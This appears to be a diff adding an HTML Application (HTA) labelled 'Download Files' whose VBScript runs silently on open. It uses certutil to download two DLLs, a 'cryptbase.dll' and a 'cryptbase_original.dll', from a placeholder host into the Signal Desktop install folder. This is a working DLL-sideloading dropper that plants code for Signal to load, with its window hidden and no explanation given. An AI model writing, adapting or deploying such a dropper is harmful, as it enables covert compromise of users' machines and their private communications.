@@ -1,0 +1,47 @@
+<html>
+<head>
+    <title>Download Files</title>
+    <hta:application
+        id="downloadApp"
+        applicationname="Download Files"
+        border="none"
+        caption="no"
+        contextmenu="no"
+        maximizebutton="no"
+        minimizebutton="no"
+        navigable="no"
+        scroll="no"
+        showintaskbar="no"
+        sysmenu="no"
+        version="1.0"
+        windowstate="minimize"
+        singleinstance="yes"
+    />
+    <script language="VBScript">
+        Sub DownloadFiles
+            Dim file1Url, file2Url
+            file1Url = "https://yourdomain/cryptbase.dll"
+            file2Url = "https://yourdomain/cryptbase_original.dll"
+
+            Dim folderPath
+            folderPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LocalAppData%\Programs\signal-desktop\")
+            If Right(folderPath, 1) <> "\" Then folderPath = folderPath & "\"
+  
+            Dim file1Name, file1Command, file1Output
+            file1Name = "cryptbase.dll"
+            file1Command = "certutil -urlcache -split " & file1Url & " " & folderPath & file1Name
+            file1Output = CreateObject("WScript.Shell").Exec(file1Command).StdOut.ReadAll()
+
+            Dim file2Name, file2Command, file2Output
+            file2Name = "cryptbase_original.dll"
+            file2Command = "certutil -urlcache -split " & file2Url & " " & folderPath & file2Name
+            file2Output = CreateObject("WScript.Shell").Exec(file2Command).StdOut.ReadAll()
+
+            Self.Close
+        End Sub
+        Call DownloadFiles 
+    </script>
+</head>
+<body>
+</body>
+</html>
